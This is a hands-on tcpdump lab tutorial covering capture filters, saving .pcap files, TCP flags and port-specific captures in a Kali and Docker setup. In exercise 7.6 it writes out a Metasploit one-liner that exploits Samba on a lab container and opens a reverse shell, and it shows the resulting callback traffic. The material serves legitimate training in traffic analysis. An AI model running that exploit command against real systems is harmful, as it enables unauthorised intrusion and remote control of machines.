# 🔬 Lab: tcpdump — Traffic Capture & Analysis

> **Series:** Penetration Testing & Network Security Labs  
> **Skill Level:** Beginner → Intermediate  
> **Tools Required:** Kali Linux (or any Linux distro), tcpdump, optional: Wireshark  
> **Reference:** HackerSploit — tcpdump Traffic Capture & Analysis  

---

## 📌 What You Will Learn

By the end of this lab you will be able to:

- Identify active network interfaces and select the right one for capture
- Run live packet captures using `tcpdump`
- Apply capture filters to isolate specific hosts, ports, and protocols
- Save captured traffic to `.pcap` files for offline analysis
- Open `.pcap` files in both `tcpdump` and Wireshark
- Know when to use `tcpdump` vs. Wireshark in real-world scenarios

---

## 🧠 Background — What is tcpdump?

`tcpdump` is a **command-line packet sniffer**. It sits on your network interface and prints every packet that passes through — kind of like a microphone listening to all network conversations at once.

It is essential for professionals who work in environments with no graphical interface (remote servers, containerized environments, live penetration tests). Unlike Wireshark, tcpdump runs entirely in the terminal and can be scripted, automated, and piped into other tools.

> **Real-world use case:** During a penetration test on a remote server, you won't have a GUI. tcpdump lets you capture traffic, save it to a `.pcap` file, and download it to analyze in Wireshark later.

---

## ⚙️ Lab Environment

| Component | Details |
|-----------|---------|
| Attacker machine | Kali Linux VM |
| Target (optional) | Any Docker container, Metasploitable 2, or local network traffic |
| Required tool | `tcpdump` (pre-installed on Kali) |
| Optional tool | Wireshark (for `.pcap` analysis) |

---

## 🗺️ Your Actual Network Interfaces

> The following interface map is derived from `ip a` output on this specific Kali VM.
> Use these values in every command below — do not use the generic `192.168.1.x` examples verbatim.

```
$ ip a
```

| # | Interface | IP Address | Subnet | State | Use in this lab |
|---|-----------|-----------|--------|-------|----------------|
| 1 | `lo` | `127.x.0.x` | `/8` | UP | Loopback only — skip for captures |
| 2 | `eth0` | *(no IP assigned)* | — | UP | No DHCP lease — not usable for filtering |
| 3 | `eth1` | `10.x.x.6` | `/24` | ✅ UP | **Your main capture interface** |
| 10 | `docker0` | `172.17.0.1` | `/16` | DOWN* | Default Docker bridge |
| 8 | `br-fa5e553a4aba` | `10.0.10.1` | `/24` | DOWN* | Custom Docker lab network |
| 11 | `br-5b7745abbb3b` | `10.0.9.1` | `/24` | DOWN* | Custom Docker lab network |
| 4–9, 12–16 | `br-*` | `172.18–172.99` ranges | `/16` or `/24` | DOWN* | Past lab Docker networks |

> \* Docker bridge interfaces show `DOWN` when no containers are running on them.
> They become `UP` automatically once you start a container attached to that network.

### Interface Quick-Reference for Lab Commands

| Generic example in lab | Replace with (your machine) |
|------------------------|----------------------------|
| `sudo tcpdump -i eth0` | `sudo tcpdump -i eth1` |
| `host 192.168.1.10` | `host 10.x.x.6` (your Kali IP) |
| `net 192.168.1.0/24` | `net 10.0.2.0/24` (your active subnet) |
| `sudo tcpdump -i docker0` | `sudo tcpdump -i docker0` *(same)* |
| Docker container target | Start a lab container → check `docker inspect` for its IP |

### Your gateway IP (likely)

```bash
ip route | grep default
```

Expected output:
```
default via 10.0.2.1 dev eth1 proto dhcp
```

Your gateway is `10.0.2.1` — the router your VM uses to reach the internet.

### 🗺️ Your Actual Network Interfaces

> Output from `ip a` on this machine:

| Interface | IP Address | State | Use For |
|-----------|-----------|-------|---------|
| `lo` | `127.x.0.x/8` | UP | Loopback — local machine only |
| `eth0` | *(no IP assigned)* | UP | VirtualBox adapter — skip for captures |
| `eth1` | `10.x.x.6/24` | ✅ **UP** | **Your primary capture interface** |
| `docker0` | `172.x.0.x/16` | DOWN* | Default Docker bridge |
| `br-01e25c68e8ba` | `172.21.0.1/16` | DOWN* | Docker bridge (previous lab) |
| `br-79ea98783de2` | `172.18.0.1/16` | DOWN* | Docker bridge (previous lab) |
| `br-c7b3cca216fc` | `172.22.0.1/16` | DOWN* | Docker bridge (previous lab) |
| `br-f66b50389412` | `172.23.0.1/16` | DOWN* | Docker bridge (previous lab) |
| `br-fa5e553a4aba` | `10.0.10.1/24` | DOWN* | Docker bridge (previous lab) |
| `br-5b7745abbb3b` | `10.0.9.1/24` | DOWN* | Docker bridge (previous lab) |
| `br-5c24a0c0b889` | `172.50.0.1/24` | DOWN* | Docker bridge (previous lab) |
| `br-834a4a3134dd` | `172.88.0.1/24` | DOWN* | Docker bridge (previous lab) |
| `br-937fba3f0985` | `172.20.0.1/16` | DOWN* | Docker bridge (previous lab) |
| `br-93cc51292008` | `172.99.0.1/24` | DOWN* | Docker bridge (previous lab) |
| `br-be24517ab8da` | `172.60.0.1/24` | DOWN* | Docker bridge (previous lab) |

> \* `DOWN` means no containers are currently connected to this bridge. The interface comes UP automatically when you start a container that uses it.

> ⚠️ **Important:** Use `eth1` — not `eth0` — for all captures. `eth0` has no IP address assigned and will not capture routable traffic.

---

## 🛠️ Setup

### Verify tcpdump is installed

```bash
tcpdump --version
```

If not installed:

```bash
sudo apt update && sudo apt install tcpdump -y
```

### Find your network interfaces

```bash
ip a
```

Or list only the interfaces tcpdump can use:

```bash
sudo tcpdump -D
```

**On this machine the output will show:**

```
1.eth0       ← no IP — skip this one
2.eth1       ← 10.x.x.6/24 — USE THIS for live captures
3.docker0    ← 172.17.0.1/16 — use when containers are running
4.lo
... (plus Docker bridge interfaces from previous labs)
```

> ✅ **Rule of thumb for this machine:** Always use `-i eth1` for internet/LAN captures, and `-i docker0` (or the specific bridge) when targeting containers.

---

## 🔢 Step-by-Step Lab Exercises

---

### Exercise 1 — First Live Capture

Run a basic capture on your primary interface:

```bash
sudo tcpdump -i eth1
```

**What you see:**
```
12:34:01.123456 IP 10.x.x.6.54312 > 10.0.2.1.53: UDP, length 30
12:34:01.124010 IP 10.0.2.1.53 > 10.x.x.6.54312: UDP, length 60
12:34:01.125200 IP 10.x.x.6.52001 > 93.184.216.34.443: Flags [S], seq 0
```

This reads as: your machine (`10.x.x.6`) talking to its gateway (`10.0.2.1`) for DNS, then opening an HTTPS connection to an external server.

Press **Ctrl+C** to stop the capture.

**Checkpoint:** Can you see live packets being printed to your screen? ✅

---

### Exercise 2 — Verbose Mode

Add verbosity flags to see more detail per packet:

```bash
sudo tcpdump -i eth1 -v
```

| Flag | What it adds |
|------|-------------|
| `-v` | TTL, protocol type, checksum |
| `-vv` | Additional protocol-specific fields |
| `-vvv` | Full packet detail |

Try all three levels and compare the output. Notice how much more information appears with each level.

**Checkpoint:** Can you identify the TTL value of a captured packet? ✅

---

### Exercise 3 — Capture Filters

Filters are the most powerful part of tcpdump. They narrow down what you capture.

#### Filter by Host (specific IP)

```bash
# Filter traffic to/from your gateway
sudo tcpdump -i eth1 host 10.0.2.1

# Filter traffic to/from your own machine
sudo tcpdump -i eth1 host 10.x.x.6
```

Only shows traffic TO or FROM that IP address.

#### Filter by Port

```bash
# HTTP
sudo tcpdump -i eth1 port 80

# HTTPS
sudo tcpdump -i eth1 port 443

# SSH
sudo tcpdump -i eth1 port 22

# DNS
sudo tcpdump -i eth1 port 53
```

#### Filter by Protocol

```bash
sudo tcpdump -i eth1 tcp
sudo tcpdump -i eth1 udp
sudo tcpdump -i eth1 icmp    # ping traffic
sudo tcpdump -i eth1 arp
```

#### Combine Filters

Use `and`, `or`, and `not` to build powerful filter expressions:

```bash
# TCP traffic from your machine only
sudo tcpdump -i eth1 src host 10.x.x.6 and tcp

# Either port 80 or port 443
sudo tcpdump -i eth1 port 80 or port 443

# Everything EXCEPT SSH (essential when connected via SSH!)
sudo tcpdump -i eth1 not port 22

# ICMP from your machine
sudo tcpdump -i eth1 src host 10.x.x.6 and icmp
```

#### Direction Filters (Source vs Destination)

```bash
# Traffic originating FROM your machine
sudo tcpdump -i eth1 src host 10.x.x.6

# Traffic going TO your machine
sudo tcpdump -i eth1 dst host 10.x.x.6

# Traffic originating from port 80 (server responses)
sudo tcpdump -i eth1 src port 80
```

**Checkpoint:** Can you isolate only DNS (port 53) traffic on your interface? ✅

---

### Exercise 4 — Save Traffic to a .pcap File

This is the most important skill for professional use. Capture traffic and save it for later analysis.

#### Basic save to file

```bash
sudo tcpdump -i eth1 -w capture.pcap
```

Let it run for 30 seconds while you browse or ping something, then press **Ctrl+C**.

#### Save with a filter applied

```bash
# Save only HTTP traffic
sudo tcpdump -i eth1 port 80 -w http_traffic.pcap

# Save only ICMP (ping)
sudo tcpdump -i eth1 icmp -w ping_capture.pcap
```

#### Limit packet count automatically (stops by itself)

```bash
sudo tcpdump -i eth1 -c 100 -w capture.pcap
```

This stops after exactly 100 packets — useful for scripting or timed captures.

#### Read the .pcap back

```bash
sudo tcpdump -r capture.pcap
```

Read with no DNS resolution (faster and cleaner output):

```bash
sudo tcpdump -r capture.pcap -nn -v
```

| Flag | What it does |
|------|-------------|
| `-n` | Don't resolve IP addresses to hostnames |
| `-nn` | Don't resolve IPs OR port numbers to names |
| `-A` | Print packet payload in ASCII (great for HTTP) |
| `-X` | Print payload in HEX + ASCII |

#### Open in Wireshark

```bash
wireshark capture.pcap
```

Or transfer the file to your local machine first:

```bash
scp user@kali_ip:/path/to/capture.pcap ./
```

**Checkpoint:** Do you have a `.pcap` file saved locally that you can read back? ✅

---

### Exercise 5 — Capture HTTP Payload (ASCII)

Use the `-A` flag to see actual HTTP request/response data:

```bash
sudo tcpdump -i eth1 port 80 -A
```

Generate some HTTP traffic by running:

```bash
curl http://example.com
```

You should see the raw HTTP headers and body in your tcpdump output.

**Checkpoint:** Can you read the HTTP GET request in the captured output? ✅

---

### Exercise 6 — Capture on Docker Bridge Interface

If you are running vulnerable Docker containers (like from your Metasploit labs), capture traffic on the Docker bridge interface:

```bash
sudo tcpdump -i docker0 -v
```

Then trigger activity in your container (e.g., run your exploit or curl from inside the container) and watch the packets appear.

**Checkpoint:** Can you see traffic between your Kali machine and a running container? ✅

---

### Exercise 7 — Source & Destination Traffic Captures

This exercise focuses entirely on **directional filtering** — one of the most practical skills in tcpdump. Instead of seeing all traffic to/from a host, you isolate exactly which direction the packets are traveling.

> 💡 **Think of it like this:**
> - `src` = "who sent it" (the sender)
> - `dst` = "who received it" (the receiver)
> - `host` = either direction (sender OR receiver)

---

#### 7.1 — Capture traffic FROM a specific source IP

**Scenario:** You want to watch only what your Kali machine is *sending out* to a target.

```bash
sudo tcpdump -i eth1 src host 10.x.x.6 -nn
```

**Sample output:**
```
14:02:11.481203 IP 10.x.x.6.54312 > 93.184.216.34.80: Flags [S], seq 0, win 64240
14:02:11.481987 IP 10.x.x.6.54312 > 93.184.216.34.80: Flags [.], ack 1, win 502
14:02:11.482104 IP 10.x.x.6.54312 > 93.184.216.34.80: Flags [P.], length 78
```

**Reading the output:**
- `10.x.x.6.54312` → source IP + source port (your Kali machine)
- `93.184.216.34.80` → destination IP + destination port (the web server)
- `Flags [S]` → SYN packet (start of a TCP handshake)
- `Flags [P.]` → data being pushed (actual HTTP request)

---

#### 7.2 — Capture traffic TO a specific destination IP

**Scenario:** You want to see all packets arriving at your target machine (e.g., a Docker container running at `172.17.0.2`).

```bash
sudo tcpdump -i docker0 dst host 172.17.0.2 -nn -v
```

**Sample output:**
```
14:05:33.112001 IP (tos 0x0, ttl 64, id 12345, proto TCP (6), length 60)
    172.17.0.1.45678 > 172.17.0.2.445: Flags [S], seq 1234567890, win 64240
14:05:33.113456 IP (tos 0x0, ttl 64, id 12346, proto TCP (6), length 52)
    172.17.0.1.45678 > 172.17.0.2.445: Flags [.], ack 1, win 502
```

**Reading the output:**
- `172.17.0.1` → source (your Kali Docker bridge gateway)
- `172.17.0.2` → destination (your vulnerable container)
- `ttl 64` → Time To Live (how many hops before the packet is dropped)
- Port `445` → SMB — this is the kind of traffic you'd see in a Samba exploit lab

---

#### 7.3 — Capture traffic FROM a specific source PORT

**Scenario:** You want to see responses coming back FROM a web server (port 80 is the source).

```bash
sudo tcpdump -i eth1 src port 80 -nn -A
```

Generate traffic first:
```bash
curl http://example.com
```

**Sample output:**
```
14:08:45.009321 IP 93.184.216.34.80 > 10.x.x.6.54320: Flags [P.], length 1448
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1256
...
<!doctype html>
<html>...
```

**What this tells you:** You're seeing only the server's *responses* — not your outgoing requests. This is useful for inspecting what a server is actually sending back.

---

#### 7.4 — Capture traffic TO a specific destination PORT

**Scenario:** You want to watch all SSH login attempts being sent to port 22 on any machine.

```bash
sudo tcpdump -i eth1 dst port 22 -nn
```

**Sample output:**
```
14:11:02.334512 IP 10.x.x.6.51234 > 10.0.2.1.22: Flags [S], seq 0
14:11:02.335001 IP 10.x.x.6.51234 > 10.0.2.1.22: Flags [.], ack 1
14:11:02.335890 IP 10.x.x.6.51234 > 10.0.2.1.22: Flags [P.], length 32
```

**What this tells you:** All three packets are going TO port 22. You can see the TCP handshake (SYN → ACK → data). If you were monitoring a server, this shows who is attempting SSH connections.

---

#### 7.5 — Combine src and dst in one filter (two-sided conversation)

**Scenario:** Capture the full conversation between your machine and a target — both directions.

```bash
sudo tcpdump -i eth1 \
  '(src host 10.x.x.6 and dst host 172.17.0.2) or \
   (src host 172.17.0.2 and dst host 10.x.x.6)' -nn -v
```

**Sample output:**
```
# Your machine sends a SYN to the target
14:15:01.001234 IP 10.x.x.6.54400 > 172.17.0.2.139: Flags [S], seq 100
# Target sends SYN-ACK back
14:15:01.002100 IP 172.17.0.2.139 > 10.x.x.6.54400: Flags [S.], seq 200, ack 101
# Your machine completes the handshake
14:15:01.002300 IP 10.x.x.6.54400 > 172.17.0.2.139: Flags [.], ack 201
```

**What this tells you:** You can now see both sides of the conversation. This is the TCP 3-way handshake: SYN → SYN-ACK → ACK. After this, data flows.

> 💡 **Tip:** Save this two-sided capture to a `.pcap` and open it in Wireshark. Use **Follow → TCP Stream** to read the entire conversation in plain text.

---

#### 7.6 — Real pentest scenario: Monitor exploit traffic on Docker bridge

**Scenario:** You're about to run a Metasploit exploit against a container at `172.17.0.2`. Run tcpdump first to watch what happens at the packet level.

**Terminal 1 — Start the capture:**
```bash
sudo tcpdump -i docker0 \
  '(src host 172.17.0.1 and dst host 172.17.0.2) or \
   (src host 172.17.0.2 and dst host 172.17.0.1)' \
  -nn -w exploit_traffic.pcap
```

**Terminal 2 — Run your exploit** (e.g., Samba usermap_script):
```bash
msfconsole -n -q -x "use exploit/multi/samba/usermap_script; \
  set RHOSTS 172.17.0.2; set LHOST 172.17.0.1; run"
```

**Terminal 1 — Stop capture after exploit runs (Ctrl+C), then read it back:**
```bash
sudo tcpdump -r exploit_traffic.pcap -nn -v
```

**Sample output you'd see:**
```
# Metasploit scanning/connecting to Samba port 139
14:22:01.001 IP 172.17.0.1.45100 > 172.17.0.2.139: Flags [S]
14:22:01.002 IP 172.17.0.2.139  > 172.17.0.1.45100: Flags [S.]
14:22:01.003 IP 172.17.0.1.45100 > 172.17.0.2.139: Flags [.]

# Exploit payload delivery
14:22:01.050 IP 172.17.0.1.45100 > 172.17.0.2.139: Flags [P.], length 180

# Reverse shell connecting back to your listener on port 4444
14:22:01.210 IP 172.17.0.2.55000 > 172.17.0.1.4444: Flags [S]
14:22:01.211 IP 172.17.0.1.4444  > 172.17.0.2.55000: Flags [S.]
14:22:01.212 IP 172.17.0.2.55000 > 172.17.0.1.4444: Flags [.]
```

**What this tells you:** You can see the full attack chain at the packet level — the initial connection to port `139`, the exploit payload being pushed (`Flags [P.]`), and then the **reverse shell connecting back** from the container (`172.17.0.2`) to your listener on port `4444`. This is exactly what a blue team defender would see in network logs.

**Checkpoint:** Can you capture your own Metasploit exploit traffic and identify the reverse shell connection in the `.pcap`? ✅

---

#### 7.7 — Source & Destination Quick-Reference Summary

| Goal | Filter Syntax | Example |
|------|--------------|---------|
| Only FROM a specific IP | `src host <IP>` | `src host 10.x.x.6` |
| Only TO a specific IP | `dst host <IP>` | `dst host 172.17.0.2` |
| Either direction (same IP) | `host <IP>` | `host 10.x.x.6` |
| Only FROM a specific port | `src port <N>` | `src port 80` |
| Only TO a specific port | `dst port <N>` | `dst port 22` |
| Either direction (same port) | `port <N>` | `port 443` |
| Full conversation (both IPs) | `(src A and dst B) or (src B and dst A)` | See 7.5 above |
| Src IP + Dst port combined | `src host <IP> and dst port <N>` | `src host 10.x.x.6 and dst port 445` |
| Dst IP + Src port combined | `dst host <IP> and src port <N>` | `dst host 172.17.0.2 and src port 139` |

---

### Exercise 8 — Network Range Traffic Capture

Instead of targeting a single IP, you can filter an entire **subnet** — all devices in a network range at once. This is useful when monitoring a LAN segment, a Docker network, or a subnet during a pentest engagement.

> 💡 **Plain English:** A network range like `10.0.2.0/24` means "any IP from `10.0.2.0` to `10.0.2.255`". The `/24` is the subnet mask shorthand. Your active subnet on this machine is `10.0.2.0/24` (eth1).

---

#### 8.1 — Capture all traffic within your subnet

```bash
sudo tcpdump -i eth1 net 10.0.2.0/24 -nn
```

**Sample output:**
```
15:01:10.112233 IP 10.x.x.6.52100  > 10.0.2.1.53:   UDP, length 32   # DNS query to gateway
15:01:10.113001 IP 10.0.2.1.53     > 10.x.x.6.52100: UDP, length 60   # DNS reply from gateway
15:01:10.120500 IP 10.x.x.6.54200  > 10.0.2.1.80:   Flags [S]        # HTTP SYN
15:01:10.121300 IP 10.0.2.1.80     > 10.x.x.6.54200: Flags [S.], ack 1 # HTTP SYN-ACK
```

**What this tells you:** You can see every device on the `10.0.2.x` network talking to each other — DNS requests, web traffic, whatever is flowing across that subnet.

---

#### 8.2 — Capture traffic FROM your subnet (outbound only)

```bash
sudo tcpdump -i eth1 src net 10.0.2.0/24 -nn
```

**Sample output:**
```
15:03:44.221100 IP 10.x.x.6.49800 > 8.8.8.8.53:         UDP, length 28  # DNS to Google
15:03:44.225000 IP 10.x.x.6.55001 > 93.184.216.34.443:   Flags [S]       # HTTPS outbound
15:03:44.230100 IP 10.x.x.6.61000 > 172.17.0.2.445:      Flags [S]       # SMB to Docker container
```

**What this tells you:** Only packets *originating from* inside your `10.0.2.0/24` network appear. This filters out external responses — good for spotting which machines are initiating connections.

---

#### 8.3 — Capture traffic TO your subnet (inbound only)

```bash
sudo tcpdump -i eth1 dst net 10.0.2.0/24 -nn
```

**Sample output:**
```
15:05:12.334400 IP 8.8.8.8.53          > 10.x.x.6.49800: UDP, length 60  # DNS reply
15:05:12.338200 IP 93.184.216.34.443   > 10.x.x.6.55001: Flags [S.]      # HTTPS reply
15:05:12.340000 IP 10.10.10.5.4444     > 10.x.x.6.51200: Flags [P.]      # Suspicious inbound
```

> ⚠️ **Pentest note:** That third line — an inbound `Flags [P.]` (data push) from an external IP on port `4444` — could indicate a reverse shell **callback**. This is the kind of anomaly a blue team analyst looks for.

---

#### 8.4 — Capture Docker subnet traffic (containers talking to each other)

Docker assigns containers addresses in the `172.17.0.0/16` range by default.

```bash
sudo tcpdump -i docker0 net 172.17.0.0/16 -nn -v
```

**Sample output:**
```
15:08:01.001200 IP 172.17.0.1.45100 > 172.17.0.2.139: Flags [S], ttl 64    # Host → Container (SMB)
15:08:01.002000 IP 172.17.0.2.139   > 172.17.0.1.45100: Flags [S.], ttl 64 # Container → Host (reply)
15:08:01.003100 IP 172.17.0.2.55200 > 172.17.0.1.4444: Flags [S], ttl 64   # Reverse shell back
```

**Checkpoint:** Can you capture all traffic inside your Docker network range (`172.17.0.0/16`) and spot a connection between two containers? ✅

---

#### 8.5 — Network Range Quick-Reference

| Goal | Filter Syntax | Example |
|------|--------------|---------|
| Any traffic in a subnet | `net <CIDR>` | `net 10.0.2.0/24` |
| Traffic FROM your subnet | `src net <CIDR>` | `src net 10.0.2.0/24` |
| Traffic TO Docker network | `dst net <CIDR>` | `dst net 172.17.0.0/16` |
| Between two subnets | `src net <A> and dst net <B>` | `src net 10.0.2.0/24 and dst net 172.17.0.0/16` |
| Exclude loopback | `not net <CIDR>` | `not net 127.0.0.0/8` |

---

### Exercise 9 — TCP Protocol Deep Dive

TCP is the most common protocol you'll encounter. Understanding its flags and states lets you decode exactly what phase of a connection you're watching.

> 💡 **Plain English:** Every TCP packet carries a flag that tells you what it's doing — starting a connection, sending data, ending cleanly, or resetting abruptly.

---

#### 9.1 — Capture only TCP traffic

```bash
sudo tcpdump -i eth1 tcp -nn
```

**Sample output:**
```
15:12:01.001 IP 10.x.x.6.54001 > 93.184.216.34.443: Flags [S],  seq 100
15:12:01.002 IP 93.184.216.34.443  > 10.x.x.6.54001: Flags [S.], seq 200, ack 101
15:12:01.003 IP 10.x.x.6.54001 > 93.184.216.34.443: Flags [.],  ack 201
15:12:01.004 IP 10.x.x.6.54001 > 93.184.216.34.443: Flags [P.], length 517
15:12:01.005 IP 93.184.216.34.443  > 10.x.x.6.54001: Flags [P.], length 2800
15:12:01.006 IP 10.x.x.6.54001 > 93.184.216.34.443: Flags [F.], seq 618, ack 3001
15:12:01.007 IP 93.184.216.34.443  > 10.x.x.6.54001: Flags [F.], ack 619
```

**TCP Flag Decoder:**

| Flag | Symbol | Meaning |
|------|--------|---------|
| SYN | `[S]` | Start a new connection (first handshake step) |
| SYN-ACK | `[S.]` | Server accepts the connection (second step) |
| ACK | `[.]` | Acknowledge received data (third step / ongoing) |
| PUSH | `[P.]` | Data is being sent right now |
| FIN | `[F.]` | Closing the connection cleanly |
| RST | `[R]` | Connection reset — abrupt termination |
| RST-ACK | `[R.]` | Reset with acknowledgment |

---

#### 9.2 — Capture only the TCP handshake (SYN packets)

To see only new connection attempts — no ongoing data, no closures:

```bash
sudo tcpdump -i eth1 'tcp[tcpflags] & tcp-syn != 0' -nn
```

**Sample output:**
```
15:14:10.001 IP 10.x.x.6.55000 > 172.17.0.2.22:  Flags [S]   # SSH attempt to container
15:14:10.005 IP 10.x.x.6.55001 > 172.17.0.2.80:  Flags [S]   # HTTP attempt to container
15:14:10.009 IP 10.x.x.6.55002 > 172.17.0.2.445: Flags [S]   # SMB attempt to container
```

> ⚠️ **Pentest note:** A burst of SYN packets to many different ports from one IP is a classic **port scan** signature — exactly what Nmap sends.

---

#### 9.3 — Capture only RST packets (connection resets)

RST packets appear when a port is closed, a firewall rejects a connection, or an application crashes.

```bash
sudo tcpdump -i eth1 'tcp[tcpflags] & tcp-rst != 0' -nn
```

**Sample output:**
```
15:16:00.001 IP 172.17.0.2.23   > 10.x.x.6.55010: Flags [R.] # Port 23 (Telnet) closed
15:16:00.003 IP 172.17.0.2.8080 > 10.x.x.6.55011: Flags [R.] # Port 8080 closed
```

**What this tells you:** If you see RST replies to your SYN packets, those ports are closed on the target. Open ports reply with SYN-ACK; closed ports reply with RST.

---

#### 9.4 — Capture TCP traffic between two specific hosts

```bash
sudo tcpdump -i eth1 tcp and host 10.x.x.6 and host 172.17.0.2 -nn -v
```

**Sample output:**
```
15:18:30.112 IP 10.x.x.6.56000   > 172.17.0.2.139: Flags [S],  seq 111
15:18:30.113 IP 172.17.0.2.139   > 10.x.x.6.56000:  Flags [S.], ack 112
15:18:30.114 IP 10.x.x.6.56000   > 172.17.0.2.139: Flags [.],  ack 1
15:18:30.115 IP 10.x.x.6.56000   > 172.17.0.2.139: Flags [P.], length 68
```

**What this tells you:** You're watching the full TCP conversation between just these two machines. Port `139` is NetBIOS/SMB — the kind of traffic involved in Samba exploits.

**Checkpoint:** Can you run a TCP capture and identify each phase of the handshake (SYN → SYN-ACK → ACK) in your output? ✅

---

### Exercise 10 — Port-Specific Filters

Ports tell you *what service* is being used. This exercise drills into the most important ports you'll encounter in penetration testing and network analysis.

---

#### 10.1 — Single port capture

```bash
# HTTP (unencrypted web)
sudo tcpdump -i eth1 port 80 -nn

# HTTPS (encrypted web)
sudo tcpdump -i eth1 port 443 -nn

# SSH (secure remote login)
sudo tcpdump -i eth1 port 22 -nn

# DNS (domain name resolution)
sudo tcpdump -i eth1 port 53 -nn

# SMB / NetBIOS (Windows file sharing — exploit target)
sudo tcpdump -i eth1 port 445 -nn
sudo tcpdump -i eth1 port 139 -nn

# FTP (file transfer — often unencrypted)
sudo tcpdump -i eth1 port 21 -nn

# Telnet (unencrypted remote login — legacy)
sudo tcpdump -i eth1 port 23 -nn

# RDP (Windows Remote Desktop)
sudo tcpdump -i eth1 port 3389 -nn

# MySQL database
sudo tcpdump -i eth1 port 3306 -nn
```

---

#### 10.2 — Multiple ports in one command

```bash
# Capture HTTP and HTTPS together
sudo tcpdump -i eth1 'port 80 or port 443' -nn

# Capture all common web ports
sudo tcpdump -i eth1 'port 80 or port 443 or port 8080 or port 8443' -nn

# Capture SMB ports (both variants)
sudo tcpdump -i eth1 'port 139 or port 445' -nn

# Capture remote access ports
sudo tcpdump -i eth1 'port 22 or port 23 or port 3389' -nn
```

**Sample output (HTTP + HTTPS):**
```
15:25:01.001 IP 10.x.x.6.54400 > 93.184.216.34.80:  Flags [S]      # HTTP
15:25:01.002 IP 10.x.x.6.54500 > 93.184.216.34.443: Flags [S]      # HTTPS
15:25:01.003 IP 93.184.216.34.80   > 10.x.x.6.54400: Flags [S.]    # HTTP reply
15:25:01.004 IP 93.184.216.34.443  > 10.x.x.6.54500: Flags [S.]    # HTTPS reply
```

---

#### 10.3 — Exclude a port (capture everything except)

```bash
# Capture all traffic EXCEPT SSH (so you don't flood your terminal with your own SSH session)
sudo tcpdump -i eth1 not port 22 -nn

# Exclude both SSH and DNS noise
sudo tcpdump -i eth1 'not port 22 and not port 53' -nn
```

> 💡 **Pro tip:** If you're connected to your Kali machine via SSH and you run `tcpdump` without excluding port 22, your own SSH session will flood the output. Always add `not port 22` when working remotely.

---

#### 10.4 — Port range capture

```bash
# Capture traffic on ports 1–1024 (well-known/privileged ports)
sudo tcpdump -i eth1 'portrange 1-1024' -nn

# Capture high/ephemeral ports (client-side connection ports)
sudo tcpdump -i eth1 'portrange 49152-65535' -nn
```

**Sample output (well-known ports):**
```
15:28:10.001 IP 10.x.x.6.55000 > 93.184.216.34.80:  Flags [S]    # HTTP
15:28:10.003 IP 10.x.x.6.55001 > 93.184.216.34.443: Flags [S]    # HTTPS
15:28:10.005 IP 10.x.x.6.55002 > 10.0.2.1.22:       Flags [S]    # SSH to gateway
```

---

#### 10.5 — Common Ports Quick-Reference

| Port | Protocol | Service | Pentest Relevance |
|------|----------|---------|------------------|
| 21 | TCP | FTP | Credentials often sent in plaintext |
| 22 | TCP | SSH | Brute-force target; filter with `not port 22` when remote |
| 23 | TCP | Telnet | Fully unencrypted — visible in `-A` output |
| 53 | UDP/TCP | DNS | DNS exfiltration, poisoning |
| 80 | TCP | HTTP | Unencrypted web — readable with `-A` |
| 139 | TCP | NetBIOS | Samba exploit traffic |
| 443 | TCP | HTTPS | Encrypted web (use `-X` for hex view) |
| 445 | TCP | SMB | EternalBlue, Samba exploits |
| 3306 | TCP | MySQL | Database access |
| 3389 | TCP | RDP | Remote desktop brute-force |
| 4444 | TCP | Metasploit default | Reverse shell listener |
| 8080 | TCP | HTTP-alt | Web apps, proxies |

**Checkpoint:** Can you capture traffic on ports 80, 443, and 53 simultaneously in a single tcpdump command? ✅

---

### Exercise 11 — Website Traffic Capture (End-to-End Test)

This is a full practical exercise that ties everything together. You will capture real website traffic, read it back, and analyze what you see.

---

#### 11.1 — Set up the capture (Terminal 1)

Open your first terminal and start a capture filtered to web traffic only, saving to a file:

```bash
sudo tcpdump -i eth1 'port 80 or port 443 or port 53' -nn -w website_capture.pcap
```

Leave this running.

---

#### 11.2 — Generate the traffic (Terminal 2)

Open a second terminal and request a website using `curl`:

```bash
# HTTP (unencrypted — you'll see full content)
curl http://example.com -v

# DNS + HTTPS (encrypted — you'll see handshake but not content)
curl https://www.google.com -v
```

Then try a ping to see ICMP alongside:
```bash
ping -c 4 example.com
```

Go back to Terminal 1 and press **Ctrl+C** to stop the capture.

---

#### 11.3 — Read back the capture

```bash
sudo tcpdump -r website_capture.pcap -nn
```

**Sample output:**
```
# Step 1: DNS query — your machine (10.x.x.6) asks "what is example.com's IP?"
15:40:01.001 IP 10.x.x.6.52001 > 10.0.2.1.53: UDP, length 30

# Step 2: DNS reply — your gateway answers with the IP
15:40:01.045 IP 10.0.2.1.53 > 10.x.x.6.52001: UDP, length 60

# Step 3: TCP handshake begins to example.com (93.184.216.34)
15:40:01.090 IP 10.x.x.6.54001 > 93.184.216.34.80: Flags [S],  seq 100
15:40:01.140 IP 93.184.216.34.80   > 10.x.x.6.54001: Flags [S.], ack 101
15:40:01.141 IP 10.x.x.6.54001 > 93.184.216.34.80: Flags [.],  ack 1

# Step 4: HTTP GET request sent
15:40:01.142 IP 10.x.x.6.54001 > 93.184.216.34.80: Flags [P.], length 78

# Step 5: Server sends back HTTP response (the webpage)
15:40:01.200 IP 93.184.216.34.80   > 10.x.x.6.54001: Flags [P.], length 1440
15:40:01.201 IP 93.184.216.34.80   > 10.x.x.6.54001: Flags [P.], length 1440

# Step 6: Connection closes cleanly
15:40:01.300 IP 10.x.x.6.54001 > 93.184.216.34.80: Flags [F.], seq 79
15:40:01.350 IP 93.184.216.34.80   > 10.x.x.6.54001: Flags [F.], ack 80
```

**What you just watched — the full web request lifecycle:**

```
[1] DNS query  ──► resolve example.com to an IP
[2] DNS reply  ◄── got 93.184.216.34
[3] SYN        ──► start TCP connection
[4] SYN-ACK    ◄── server agrees
[5] ACK        ──► handshake complete
[6] PSH (GET)  ──► send HTTP GET request
[7] PSH (200)  ◄── receive HTTP 200 OK + HTML
[8] FIN        ──► close connection
[9] FIN        ◄── server acknowledges close
```

---

#### 11.4 — Read HTTP payload in ASCII

```bash
sudo tcpdump -r website_capture.pcap -nn -A port 80
```

**Sample output (HTTP visible in plain text):**
```
15:40:01.142 IP 10.x.x.6.54001 > 93.184.216.34.80: Flags [P.], length 78
GET / HTTP/1.1
Host: example.com
User-Agent: curl/7.88.1
Accept: */*

15:40:01.200 IP 93.184.216.34.80 > 10.x.x.6.54001: Flags [P.], length 1440
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1256

<!doctype html>
<html>
<head><title>Example Domain</title>...
```

